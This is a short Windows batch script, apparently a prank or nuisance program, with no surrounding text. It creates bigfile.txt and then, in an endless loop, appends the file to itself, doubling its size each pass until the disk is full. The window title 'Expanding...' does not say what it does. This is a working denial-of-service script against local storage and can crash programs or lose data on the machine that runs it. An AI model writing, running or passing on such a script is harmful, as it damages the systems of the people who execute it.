@echo off
title Expanding...
echo string >> bigfile.txt
:a
type bigfile.txt >> bigfile.txt
goto a
